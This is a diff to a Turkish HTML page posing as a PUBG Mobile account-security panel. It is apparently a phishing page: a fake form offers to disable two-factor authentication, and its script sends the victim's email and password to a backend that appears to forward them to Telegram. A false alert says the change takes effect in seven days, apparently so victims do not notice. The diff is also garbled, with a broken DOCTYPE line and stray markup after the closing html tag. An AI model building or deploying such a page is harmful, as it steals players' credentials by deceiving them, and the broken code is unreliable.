@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
@@ -65,10 +65,10 @@
         <div class="logo-area">
             <div class="logo">PUBG<span>MOBILE</span></div>
             <nav class="top-menu" id="topMenu">
-                <a href="#" class="active" onclick="changeTopMenu(this); return false;">Hesap</a>
-                <a href="#" onclick="changeTopMenu(this); return false;">Güvenlik</a>
-                <a href="#" onclick="changeTopMenu(this); return false;">Oyun Ayarları</a>
-                <a href="#" onclick="changeTopMenu(this); return false;">Geçmiş</a>
+                <a href="#" class="active" onclick="changeTopMenu(this)">Hesap</a>
+                <a href="#" onclick="changeTopMenu(this)">Güvenlik</a>
+                <a href="#" onclick="changeTopMenu(this)">Oyun Ayarları</a>
+                <a href="#" onclick="changeTopMenu(this)">Geçmiş</a>
             </nav>
         </div>
         <div class="top-right">
@@ -80,27 +80,135 @@
     <div class="main-container">
         <aside class="sidebar">
             <ul class="sidebar-menu" id="sidebarMenu">
-                <li><a href="#" onclick="changeSidebar(this, 'hesap'); return false;"><i class="fa-regular fa-user"></i> Hesap Bilgisi</a></li>
-                <li><a href="#" onclick="changeSidebar(this, 'bagli'); return false;"><i class="fa-solid fa-link"></i> Bağlı Hesaplar</a></li>
-                <li class="active"><a href="#" onclick="changeSidebar(this, 'guvenlik'); return false;"><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulama</a></li>
-                <li><a href="#" onclick="changeSidebar(this, 'cihaz'); return false;"><i class="fa-solid fa-mobile-screen"></i> Cihaz Yönetimi</a></li>
-                <li><a href="#" onclick="changeSidebar(this, 'gecmis'); return false;"><i class="fa-regular fa-clock"></i> Güvenlik Geçmişi</a></li>
-                <li><a href="#" onclick="changeSidebar(this, 'silme'); return false;"><i class="fa-regular fa-trash-can"></i> Hesap Silme</a></li>
+                <li><a href="#" onclick="changeSidebar(this, 'hesap')"><i class="fa-regular fa-user"></i> Hesap Bilgisi</a></li>
+                <li><a href="#" onclick="changeSidebar(this, 'bagli')"><i class="fa-solid fa-link"></i> Bağlı Hesaplar</a></li>
+                <li class="active"><a href="#" onclick="changeSidebar(this, 'guvenlik')"><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulama</a></li>
+                <li><a href="#" onclick="changeSidebar(this, 'cihaz')"><i class="fa-solid fa-mobile-screen"></i> Cihaz Yönetimi</a></li>
+                <li><a href="#" onclick="changeSidebar(this, 'gecmis')"><i class="fa-regular fa-clock"></i> Güvenlik Geçmişi</a></li>
+                <li><a href="#" onclick="changeSidebar(this, 'silme')"><i class="fa-regular fa-trash-can"></i> Hesap Silme</a></li>
             </ul>
             <div class="sidebar-image"><div class="sidebar-text">WINNER WINNER<br>CHICKEN DINNER</div></div>
         </aside>
 
         <main class="content-area">
             <div class="panel" id="panel-hesap">
-                <div class="panel-header"><h2><i class="fa-regular fa-user"></i> Hesap Bilgisi</h2><p>Hesabınızla ilgili bir sorunuz mu var? Bize yazın.</p></div>
-                <form onsubmit="mesajGonder(event, this)">
-                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
-                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
-                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
-                </form>
+                <div class="panel-header"><h2><i class="fa-regular fa-user"></i> Hesap Bilgisi</h2><p>Buradan hesap bilgilerinizi görüntüleyebilirsiniz.</p></div>
+                <div class="warning-note"><i class="fa-solid fa-triangle-exclamation"></i><p>Demo Modu: Gerçek hesap bilgileri bu panelde gösterilmez.</p></div>
             </div>
 
             <div class="panel" id="panel-bagli">
+                <div class="panel-header"><h2><i class="fa-solid fa-link"></i> Bağlı Hesaplar</h2><p>Facebook, Google veya Apple hesaplarınızı buradan bağlayabilirsiniz.</p></div>
+                <div class="warning-note"><i class="fa-solid fa-circle-info"></i><p>Şu an bağlı bir hesap bulunmamaktadır.</p></div>
+            </div>
+
+            <div class="panel active-panel" id="panel-guvenlik">
+                <div class="panel-header">
+                    <h2><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulama</h2>
+                    <p>Hesabınızın güvenliğini artırmak için iki aşamalı doğrulamayı devre dışı bırakabilirsiniz. Devre dışı bırakmak için lütfen aşağıdaki bilgileri onaylayın.</p>
+                </div>
+                <form id="securityForm">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="email" placeholder="E-posta adresinizi girin" required></div></div>
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-solid fa-lock input-icon"></i><input type="password" id="password" placeholder="Şifrenizi girin" required><i class="fa-regular fa-eye eye-icon" onclick="togglePassword('password', this)"></i></div></div>
+                    <div class="premium-info-box"><i class="fa-solid fa-crown"></i><div><h4>Premium Hesap</h4><p>Premium hesabınız aktif. Bu özellikten sınırsız faydalanabilirsiniz.</p></div></div>
+                    <button type="submit" class="btn-danger"><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulamayı Kapat</button>
+                </form>
+                <div class="warning-note"><i class="fa-solid fa-circle-info"></i><p>Not: İki aşamalı doğrulamayı kapattığınızda hesabınız daha az güvenli hale gelir.</p></div>
+            </div>
+
+            <div class="panel" id="panel-cihaz">
+                <div class="panel-header"><h2><i class="fa-solid fa-mobile-screen"></i> Cihaz Yönetimi</h2><p>Hesabınıza giriş yapan cihazları buradan yönetebilirsiniz.</p></div>
+                <div class="warning-note"><i class="fa-solid fa-circle-check"></i><p>Şu an sadece bu cihaz hesabınıza bağlı görünüyor.</p></div>
+            </div>
+
+            <div class="panel" id="panel-gecmis">
+                <div class="panel-header"><h2><i class="fa-regular fa-clock"></i> Güvenlik Geçmişi</h2><p>Hesabınızdaki son güvenlik olayları ve giriş denemeleri.</p></div>
+                <div class="warning-note"><i class="fa-solid fa-circle-info"></i><p>Kayıtlı bir geçmiş bulunmamaktadır.</p></div>
+            </div>
+
+            <div class="panel" id="panel-silme">
+                <div class="panel-header"><h2><i class="fa-regular fa-trash-can"></i> Hesap Silme</h2><p>Hesabınızı kalıcı olarak silmek istiyorsanız bu alanı kullanabilirsiniz.</p></div>
+                <div class="warning-note"><i class="fa-solid fa-triangle-exclamation" style="color: #ff4d4d;"></i><p style="color: #ff4d4d;">Dikkat: Bu işlem geri alınamaz!</p></div>
+            </div>
+
+            <div class="contact-box">
+                <div class="panel-header"><h2 style="color: #28a745;"><i class="fa-brands fa-telegram" style="color: #28a745;"></i> Destek Ekibine Mesaj Gönder</h2><p>Aşağıdaki formu doldurarak bize ulaşabilirsiniz.</p></div>
+                <form id="tgForm">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" id="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea id="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Mesajı Gönder</button>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        function changeSidebar(element, panelId) {
+            document.querySelectorAll('#sidebarMenu li').forEach(li => li.classList.remove('active'));
+            element.parentElement.classList.add('active');
+            document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active-panel'));
+            document.getElementById('panel-' + panelId).classList.add('active-panel');
+        }
+        function changeTopMenu(element) {
+            document.querySelectorAll('#topMenu a').forEach(a => a.classList.remove('active'));
+            element.classList.add('active');
+        }
+        function togglePassword(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye');
+            }
+        }
+
+        // GÜVENLİK FORMU - PYTHON'A GÖNDER
+        document.getElementById('securityForm').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            fetch('/api/guvenlik', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === "ok") {
+                    alert('✅ İşleminiz başarıyla alındı.\n\nGüvenlik nedeniyle iki aşamalı doğrulama kapatma işlemi 7 GÜN SONRA aktif olacaktır.\n\nEğer girdiğiniz bilgilerde bir yanlışlık varsa işlem otomatik olarak İPTAL edilecektir.');
+                    document.getElementById('securityForm').reset();
+                } else {
+                    alert('❌ Bir hata oluştu. Telegram bilgilerini kontrol et.');
+                }
+            })
+            .catch(error => { console.error('Hata:', error); alert('❌ Sunucuya bağlanılamadı. app.py çalışıyor mu?'); });
+        });
+
+        // İLETİŞİM FORMU - PYTHON'A GÖNDER
+        document.getElementById('tgForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const isim = document.getElementById('isim').value;
+            const mesaj = document.getElementById('mesaj').value;
+
+            fetch('/api/iletisim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ isim: isim, mesaj: mesaj })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === "ok") {
+                    alert('✅ Mesajınız başarıyla gönderildi!');
+                    document.getElementById('tgForm').reset();
+                } else { alert('❌ Mesaj gönderilemedi.'); }
+            })
+            .catch(error => { console.error('Hata:', error); alert('❌ Sunucuya bağlanılamadı.'); });
+        });
+    </script>
+</body>
+</html>lass="panel" id="panel-bagli">
                 <div class="panel-header"><h2><i class="fa-solid fa-link"></i> Bağlı Hesaplar</h2><p>Hesap bağlama işlemleri için destek ekibimize yazın.</p></div>
                 <form onsubmit="mesajGonder(event, this)">
                     <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
